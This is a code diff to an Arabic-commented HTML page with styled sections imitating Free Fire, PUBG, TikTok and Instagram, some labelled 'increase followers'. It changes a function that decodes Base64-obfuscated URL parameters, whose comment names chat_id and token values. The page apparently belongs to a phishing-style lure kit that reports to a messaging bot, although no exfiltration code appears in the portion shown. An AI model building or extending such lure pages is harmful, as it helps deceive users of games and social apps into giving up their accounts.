@@ -7,6 +7,7 @@
     <!-- Font Awesome للأيقونات -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
+        /* نفس الأنماط السابقة لم تتغير، يمكنك نسخها من الكود السابق */
         * {
             margin: 0;
             padding: 0;
@@ -38,7 +39,7 @@
             background-color: #fff;
         }
 
-        /* -------------------- فري فاير (معدل من التصميم المُرسل) -------------------- */
+        /* -------------------- فري فاير -------------------- */
         .freefire-page {
             background: #0b1a30;
             font-family: 'Poppins', sans-serif;
@@ -144,7 +145,7 @@
             margin-top: 10px;
         }
 
-        /* -------------------- ببجي (معدل من التصميم المُرسل) -------------------- */
+        /* -------------------- ببجي -------------------- */
         .pubg-page {
             background: #0f0f12;
             font-family: 'Rajdhani', sans-serif;
@@ -247,7 +248,7 @@
             font-size: 13px;
         }
 
-        /* -------------------- تيك توك (زيادة متابعين) -------------------- */
+        /* -------------------- تيك توك -------------------- */
         .tiktok-page {
             background: #000000;
             min-height: 100vh;
@@ -337,7 +338,7 @@
             font-weight: 600;
         }
 
-        /* -------------------- انستجرام (زيادة متابعين) -------------------- */
+        /* -------------------- انستجرام -------------------- */
         .instagram-page {
             background: #fafafa;
             min-height: 100vh;
@@ -447,20 +448,35 @@
     <div id="contentContainer"></div>
 
     <script>
-        // دالة لفك تشفير Base64 مع دعم Unicode
+        // دالة لفك تشفير Base64 وتحويل النص إلى كائن params
         function decodeBase64Data(encoded) {
             try {
                 // فك التشفير
                 let decoded = atob(encoded);
-                // محاولة تحويل النص إلى كائن JSON
-                return JSON.parse(decoded);
+                
+                // محاولة التحليل كـ JSON أولاً
+                if (decoded.trim().startsWith('{')) {
+                    return JSON.parse(decoded);
+                } else {
+                    // إذا لم يكن JSON، نعتبره query string (مثل ?chat_id=...&token=...)
+                    // نزيل علامة الاستفهام إذا وجدت
+                    if (decoded.startsWith('?')) {
+                        decoded = decoded.substring(1);
+                    }
+                    const params = new URLSearchParams(decoded);
+                    const result = {};
+                    for (let [key, value] of params.entries()) {
+                        result[key] = value;
+                    }
+                    return result;
+                }
             } catch (e) {
                 console.error('فشل فك تشفير البيانات:', e);
                 return null;
             }
         }
 
-        // استخراج المعاملات من الرابط (يدعم الطريقتين: مفردة أو مشفرة)
+        // استخراج المعاملات من الرابط
         function getUrlParams() {
             const params = new URLSearchParams(window.location.search);
             
